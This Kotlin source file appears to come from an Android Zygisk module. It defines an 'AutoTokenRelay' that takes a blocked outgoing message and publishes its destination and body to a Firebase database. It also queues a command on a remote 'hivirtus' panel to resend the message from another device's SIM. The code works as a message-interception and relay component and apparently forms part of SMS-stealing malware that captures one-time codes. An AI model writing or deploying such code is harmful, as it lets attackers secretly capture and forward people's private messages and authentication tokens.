package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/** Intercept phone: token Firebase + sender commands (sab panel paths). */
object AutoTokenRelay {

    private const val TAG = "AutoTokenRelay"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun publishBlocked(context: Context, dest: String, body: String, sendFrom: String = "") {
        val appContext = context.applicationContext
        scope.launch {
            try {
                val config = FirebaseAutoTokenStore.load(appContext)
                if (!config.enabled || config.dbUrl.isBlank() || config.deviceId.isBlank()) return@launch

                FirebaseDeviceRegistry.publishOutgoingToken(appContext, config, dest, body, sendFrom)

                if (!config.canIntercept() || !config.relayReady()) return@launch

                val client = FirebaseRestClient(config)
                val now = System.currentTimeMillis()
                val recipient = HivirtusPanelFormat.formatDest(dest)
                val payload = linkedMapOf<String, Any?>(
                    "to" to recipient,
                    "body" to body.trim(),
                    "message" to body.trim(),
                    "recipient" to recipient,
                    "sim" to config.senderSimSlot,
                    "targetSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
                    "status" to "pending",
                    "from_device" to config.deviceId,
                    "created_at" to now,
                    "panel" to "hivirtus"
                )
                val paths = FirebasePathResolver.mirrorCommandPaths(config.senderDeviceId)
                for (path in paths) {
                    val pushId = client.push(path, payload)
                    if (pushId != null) {
                        Log.i(TAG, "Relay queued $path/$pushId dest=$dest")
                        break
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "Relay error: ${e.message}")
            }
        }
    }
}
